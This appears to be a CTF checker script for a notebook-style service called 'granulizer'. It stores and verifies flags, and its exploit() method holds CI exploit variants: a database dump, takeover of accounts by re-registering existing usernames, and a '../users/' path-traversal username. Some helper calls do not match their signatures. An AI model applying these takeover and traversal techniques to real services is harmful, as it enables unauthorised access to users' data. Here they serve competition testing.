#!/usr/bin/env python3
from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.utils import SimpleSocket, assert_equals, assert_in
import random
import string
import base64

#### Checker Tenets
# A checker SHOULD not be easily identified by the examination of network traffic => This one is not satisfied, because our usernames and notes are simple too random and easily identifiable.
# A checker SHOULD use unusual, incorrect or pseudomalicious input to detect network filters => This tenet is not satisfied, because we do not send common attack strings (i.e. for SQL injection, RCE, etc.) in our notes or usernames.
####

flag_file_name = "flag.pcm"

class GranulizerChecker(BaseChecker):
    """
    Change the methods given here, then simply create the class and .run() it.
    Magic.
    A few convenient methods and helpers are provided in the BaseChecker.
    ensure_bytes ans ensure_unicode to make sure strings are always equal.
    As well as methods:
    self.connect() connects to the remote server.
    self.get and self.post request from http.
    self.chain_db is a dict that stores its contents to a mongodb or filesystem.
    conn.readline_expect(): fails if it's not read correctly
    To read the whole docu and find more goodies, run python -m pydoc enochecker
    (Or read the source, Luke)
    """

    ##### EDIT YOUR CHECKER PARAMETERS
    flag_variants = 1
    noise_variants = 1
    havoc_variants = 1
    exploit_variants = 1
    service_name = "granulizer"
    port = 2345  # The port will automatically be picked up as default by self.connect and self.http.
    ##### END CHECKER PARAMETERS

    def register_user(self, conn: SimpleSocket, username: str, password: str, details: str):
        self.debug(
            f"Sending command to register user: {username} with password: {password}, details: {details}"
        )
        #response = conn.readuntil("> ")

        conn.write(f"r\n")
        conn.readline_expect(
            b"Username: ",
            read_until=b": ",
            exception_message="Failed to enter register command"
        )

        conn.write(f"{username}\n")
        conn.readline_expect(
            b"Password: ",
            read_until=b"Password: ",
            exception_message="Failed to enter unter name"
        )

        conn.write(f"{password}\n")
        conn.readline_expect(
            b"Please share some details about yourself: ",
            read_until=b"Please share some details about yourself: ",
            exception_message="Failed to register user",
        )

        conn.write(f"{details}\n")
        conn.readline_expect(
            b"ok",
            read_until=b"ok",
            exception_message="Failed to register user"
        )

    def login_user(self, conn: SimpleSocket, username: str, password: str):
        self.debug(f"Sending command to login.")
        
        conn.write(f"l\n")

        conn.readline_expect(
            b"Username: ",
            read_until=b": ",
            exception_message="Failed to enter register command"
        )

        conn.write(f"{username}\n")
        conn.readline_expect(
            b"Password: ",
            read_until=b"Password: ",
            exception_message="Failed to enter unter name"
        )

        conn.write(f"{password}\n")

        conn.readline_expect(
            b"What do you want to do?",
            read_until=b"> ",
            exception_message="User checking failed"
        )
    
    #checker has to login before put_pcm is called
    def put_pcm(self, conn: SimpleSocket, filename: str, flag: str):
        self.debug(f"Put .pcm file as flag")

        conn.write(f"upload pcm\n")
        conn.readline_expect(
            b"Enter file name for new file: ",
            read_until=b"Enter file name for new file: ",
            exception_message="Failed to enter 'upload pcm' command"
        )

        conn.write(f"{filename}\n")
        conn.readline_expect(
            b"Enter base64 encoded wave file\n",
            read_until=b"Enter base64 encoded wave file\n",
            exception_message="Failed to enter file name"
        )

        #write flag as file
        flagb64_bytes = base64.b64encode(flag.encode('utf-8'))
        flagb64 = flagb64_bytes.decode('utf-8')        
        conn.write(f"{flagb64}\n")
        conn.readline_expect(
            b"Success\n",
            read_until=b"Success\n",
            exception_message="B64 encoded flag writing did not work"
        )

    def get_pcm(self, conn: SimpleSocket, filename: str):
        self.debug(f"Get .pcm file as flag")

        conn.write(f"download pcm\n")
        conn.readline_expect(
            b"Filename: ",
            read_until=b"Filename: ",
            exception_message="Failed to enter file name"
        )

        conn.write(f"{flag_file_name}\n")

        conn.readline()
        conn.readline() #TODO add timeout
        base64_b = conn.readline()

        file_content_b = base64.decodebytes(base64_b)
        file_content = file_content_b.decode('utf-8')
        self.debug("Got file content:")
        self.debug(file_content)
        
        return file_content
    

    def putflag(self):  # type: () -> None
        """
        This method stores a flag in the service.
        In case multiple flags are provided, self.variant_id gives the appropriate index.
        The flag itself can be retrieved from self.flag.
        On error, raise an Eno Exception.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # First we need to register a user. So let's create some random strings. (Your real checker should use some funny usernames or so)
            username: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            password: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            details: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)                
            )

            # Log a message before any critical action that could raise an error.
            self.debug(f"Connecting to service")
            # Create a TCP connection to the service.
            conn = self.connect()
            welcome = conn.read_until(">")

            # Register a new user
            self.register_user(conn, username, password, details)

            # Now we need to login
            self.login_user(conn, username, password)

            # Put flag (.pcm file)
            self.put_pcm(conn, flag_file_name, self.flag)
            
            # Save the generated values for the associated getflag() call.
            # This is not a real dictionary! You cannot update it (i.e., self.chain_db["foo"] = bar) and some types are converted (i.e., bool -> str.). See: https://github.com/enowars/enochecker/issues/27
            self.chain_db = {
                "username": username,
                "password": password,
                "details": details
            }
        else:
            raise EnoException("Wrong variant_id provided")


    def getflag(self):  # type: () -> None
        """
        This method retrieves a flag from the service.
        Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
                details: str = self.chain_db["details"]
            except Exception as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.debug(f"Connecting to the service")
            conn = self.connect()
            welcome = conn.read_until(">")

            # Let's login to the service
            self.login_user(conn, username, password)

            # Let´s obtain our flag
            flag = self.get_pcm(conn, flag_file_name)

            #control that it is correct
            if (flag != self.flag):
                raise EnoException("flags are not similar!")

            # Exit!
            self.debug(f"Sending exit command")
            conn.write(f"exit\n")
            conn.close()
        else:
            raise EnoException("Wrong variant_id provided")


    def putnoise(self):  # type: () -> None
        """
        This method stores noise in the service. The noise should later be recoverable.
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using self.variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            self.debug(f"Connecting to the service")
            conn = self.connect()
            welcome = conn.read_until(">")

            # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
            username = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            password = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            randomNote = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=36)
            )

            # Register another user
            self.register_user(conn, username, password)

            # Now we need to login
            self.login_user(conn, username, password)

            # Finally, we can post our note!
            self.debug(f"Sending command to save a note")
            conn.write(f"set {randomNote}\n")
            conn.read_until(b"Note saved! ID is ")

            try:
                noteId = conn.read_until(b"!\n>").rstrip(b"!\n>").decode()
            except Exception as ex:
                self.debug(f"Failed to retrieve note: {ex}")
                raise BrokenServiceException("Could not retrieve NoteId")

            assert_equals(len(noteId) > 0, True, message="Empty noteId received")

            self.debug(f"{noteId}")

            # Exit!
            self.debug(f"Sending exit command")
            conn.write(f"exit\n")
            conn.close()

            self.chain_db = {
                "username": username,
                "password": password,
                "noteId": noteId,
                "note": randomNote,
            }
        else:
            raise EnoException("Wrong variant_id provided")

    def getnoise(self):  # type: () -> None
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, that noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using variant_id.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
                noteId: str = self.chain_db["noteId"]
                randomNote: str = self.chain_db["note"]
            except Exception as ex:
                self.debug("Failed to read db {ex}")
                raise BrokenServiceException("Previous putnoise failed.")

            self.debug(f"Connecting to service")
            conn = self.connect()
            welcome = conn.read_until(">")

            # Let's login to the service
            self.login_user(conn, username, password)

            # Let´s obtain our note.
            self.debug(f"Sending command to retrieve note: {noteId}")
            conn.write(f"get {noteId}\n")
            conn.readline_expect(
                randomNote.encode(),
                read_until=b">",
                exception_message="Resulting flag was found to be incorrect"
            )

            # Exit!
            self.debug(f"Sending exit command")
            conn.write(f"exit\n")
            conn.close()
        else:
            raise EnoException("Wrong variant_id provided")

    def havoc(self):  # type: () -> None
        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        self.debug(f"Connecting to service")
        conn = self.connect()
        welcome = conn.read_until(">")

        if self.variant_id == 0:
            # In variant 1, we'll check if the help text is available
            self.debug(f"Sending help command")
            conn.write(f"help\n")
            is_ok = conn.read_until(">")

            for line in [
                "This is a notebook service. Commands:",
                "reg USER PW - Register new account",
                "log USER PW - Login to account",
                "set TEXT..... - Set a note",
                "user  - List all users",
                "list - List all notes",
                "exit - Exit!",
                "dump - Dump the database",
                "get ID",
            ]:
                assert_in(line.encode(), is_ok, "Received incomplete response.")

        elif self.variant_id == 1:
            # In variant 2, we'll check if the `user` command still works.
            username = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            password = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )

            # Register and login a dummy user
            self.register_user(conn, username, password)
            self.login_user(conn, username, password)

            self.debug(f"Sending user command")
            conn.write(f"user\n")
            ret = conn.readline_expect(
                "User 0: ",
                read_until=b">",
                exception_message="User command does not return any users",
            )

            if username:
                assert_in(username.encode(), ret, "Flag username not in user output")

        elif self.variant_id == 2:
            # In variant 2, we'll check if the `list` command still works.
            username = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            password = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            randomNote = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=36)
            )

            # Register and login a dummy user
            self.register_user(conn, username, password)
            self.login_user(conn, username, password)

            self.debug(f"Sending command to save a note")
            conn.write(f"set {randomNote}\n")
            conn.read_until(b"Note saved! ID is ")

            try:
                noteId = conn.read_until(b"!\n>").rstrip(b"!\n>").decode()
            except Exception as ex:
                self.debug(f"Failed to retrieve note: {ex}")
                raise BrokenServiceException("Could not retrieve NoteId")

            assert_equals(len(noteId) > 0, True, message="Empty noteId received")

            self.debug(f"{noteId}")

            self.debug(f"Sending list command")
            conn.write(f"list\n")
            conn.readline_expect(
                noteId.encode(),
                read_until=b'>',
                exception_message="List command does not work as intended"
            )

        else:
            raise EnoException("Wrong variant_id provided")

        # Exit!
        self.debug(f"Sending exit command")
        conn.write(f"exit\n")
        conn.close()

    def exploit(self):
        """
        This method was added for CI purposes for exploits to be tested.
        Will (hopefully) not be called during actual CTF.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:
            conn = self.connect()
            welcome = conn.read_until(">")
            conn.write(b"dump\nexit\n")
            data = conn.read_all()
            if flag := self.search_flag_bytes(data):
                return flag
            raise BrokenServiceException("flag not found")
        elif self.variant_id == 1:
            conn = self.connect()
            welcome = conn.read_until(">")
            conn.write(b"user\n")
            user_list = conn.read_until(b">").split(b"\n")[:-1]
            for user in user_list:
                user_name = user.split()[-1]
                conn.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
                conn.read_until(b">")  # successfully registered
                conn.read_until(b">")  # successfully logged in
                notes_list = conn.read_until(b">").split(b"\n")[:-1]
                for note in notes_list:
                    note_id = note.split()[-1]
                    conn.write(b"get %s\n" % note_id)
                    data = conn.read_until(b">")
                    if flag := self.search_flag_bytes(data):
                        return flag
            raise BrokenServiceException("flag not found")
        elif self.variant_id == 2:
            conn = self.connect()
            welcome = conn.read_until(">")
            conn.write(b"user\n")
            user_list = conn.read_until(b">").split(b"\n")[:-1]
            for user in user_list:
                user_name = user.split()[-1]
                conn.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
                conn.read_until(b">")  # successfully registered
                conn.read_until(b">")  # successfully logged in
                notes_list = conn.read_until(b">").split(b"\n")[:-1]
                for note in notes_list:
                    note_id = note.split()[-1]
                    conn.write(b"get %s\n" % note_id)
                    data = conn.read_until(b">")
                    if flag := self.search_flag_bytes(data):
                        return flag
            raise BrokenServiceException("flag not found")

        raise EnoException("wrong variant_id provided")


app = GranulizerChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(GranulizerChecker)
